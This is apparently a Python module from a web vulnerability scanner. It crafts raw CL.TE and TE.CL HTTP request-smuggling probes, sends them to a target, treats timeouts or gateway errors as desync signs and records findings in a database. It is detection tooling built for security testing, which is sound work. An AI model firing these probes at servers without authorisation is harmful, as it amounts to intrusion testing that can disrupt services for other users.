"""
HTTP/1.1 request smuggling and desync probes.
"""
from __future__ import annotations

import asyncio
import json
import logging
import socket
import ssl
import time
from typing import Any
from urllib.parse import urlsplit

from sqlalchemy import select

from core.database import AsyncSessionLocal
from core.models import CrawledURL, Vulnerability

logger = logging.getLogger("sentinel.smuggling_probe")

DESYNC_STATUS_CODES = {400, 408, 421, 502, 503, 504}
LATENCY_ANOMALY_SECONDS = 5.0
DEFAULT_TIMEOUT_SECONDS = 6.0


async def test_desync(url: str) -> dict[str, Any]:
    """
    Send CL.TE and TE.CL probes over raw HTTP/1.1 and persist desync anomalies.
    """
    payloads = build_smuggling_payloads(url)
    probes: list[dict[str, Any]] = []

    for attack, payload in payloads:
        response = await send_raw_http1_payload(url, payload, timeout=DEFAULT_TIMEOUT_SECONDS)
        probe = {
            "attack": attack,
            "status_code": response.get("status_code"),
            "elapsed": response.get("elapsed"),
            "timed_out": response.get("timed_out", False),
            "raw": response.get("raw", "")[:400],
        }
        probe["anomaly"] = is_desync_anomaly(probe)
        probes.append(probe)

    vulnerable = any(probe["anomaly"] for probe in probes)
    result = {
        "url": url,
        "vulnerable": vulnerable,
        "probes": probes,
        "evidence": build_evidence(probes),
    }
    if vulnerable:
        await persist_smuggling_finding(result)
    return result


def build_smuggling_payloads(url: str) -> list[tuple[str, str]]:
    parts = urlsplit(url)
    path = parts.path or "/"
    if parts.query:
        path = f"{path}?{parts.query}"
    host = parts.netloc

    cl_te = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: SENTINEL-Smuggling-Probe\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
        "0\r\n\r\n"
        "G"
    )
    te_cl = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: SENTINEL-Smuggling-Probe\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n"
        "Connection: close\r\n"
        "\r\n"
        "0\r\n\r\n"
    )
    return [("CL.TE", cl_te), ("TE.CL", te_cl)]


async def send_raw_http1_payload(url: str, payload: str, timeout: float = DEFAULT_TIMEOUT_SECONDS) -> dict[str, Any]:
    return await asyncio.to_thread(_send_raw_http1_payload_sync, url, payload, timeout)


def _send_raw_http1_payload_sync(url: str, payload: str, timeout: float) -> dict[str, Any]:
    parts = urlsplit(url)
    scheme = parts.scheme or "http"
    host = parts.hostname
    if not host:
        raise ValueError(f"URL missing host: {url}")
    port = parts.port or (443 if scheme == "https" else 80)
    started = time.perf_counter()
    raw = b""
    timed_out = False

    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        if scheme == "https":
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=host)
        with sock:
            sock.sendall(payload.encode("utf-8", errors="ignore"))
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                raw += chunk
                if len(raw) >= 8192:
                    break
    except socket.timeout:
        timed_out = True
    except OSError as exc:
        raw = f"socket error: {exc}".encode("utf-8", errors="ignore")

    elapsed = time.perf_counter() - started
    text = raw.decode("utf-8", errors="replace")
    return {
        "status_code": parse_status_code(text),
        "elapsed": elapsed,
        "timed_out": timed_out,
        "raw": text,
    }


def parse_status_code(raw_response: str) -> int | None:
    first_line = (raw_response or "").splitlines()[0:1]
    if not first_line:
        return None
    parts = first_line[0].split()
    if len(parts) < 2:
        return None
    try:
        return int(parts[1])
    except ValueError:
        return None


def is_desync_anomaly(probe: dict[str, Any]) -> bool:
    return (
        bool(probe.get("timed_out"))
        or float(probe.get("elapsed") or 0) >= LATENCY_ANOMALY_SECONDS
        or probe.get("status_code") in DESYNC_STATUS_CODES
    )


def build_evidence(probes: list[dict[str, Any]]) -> str:
    summaries = [
        f"{probe['attack']} status={probe['status_code']} elapsed={probe['elapsed']:.2f}s timeout={probe['timed_out']}"
        for probe in probes
    ]
    return "HTTP/1.1 desync probes observed anomalous behavior: " + "; ".join(summaries)


async def persist_smuggling_finding(result: dict[str, Any]) -> None:
    async with AsyncSessionLocal() as session:
        crawled_url_result = await session.execute(select(CrawledURL).where(CrawledURL.url == result["url"]))
        crawled_url = crawled_url_result.scalars().first()
        session.add(
            Vulnerability(
                crawled_url_id=crawled_url.id if crawled_url else None,
                target_id=crawled_url.target_id if crawled_url else None,
                vuln_type="HTTP Request Smuggling",
                severity="high",
                title="Potential HTTP request smuggling desync",
                description="CL.TE or TE.CL HTTP/1.1 probes produced timeout, latency, or gateway error anomalies.",
                evidence=result["evidence"],
                payload=json.dumps(result["probes"], ensure_ascii=False),
                source="smuggling_probe",
                raw_data=result,
            )
        )
        await session.commit()
        logger.warning("Persisted request smuggling finding for %s", result["url"])
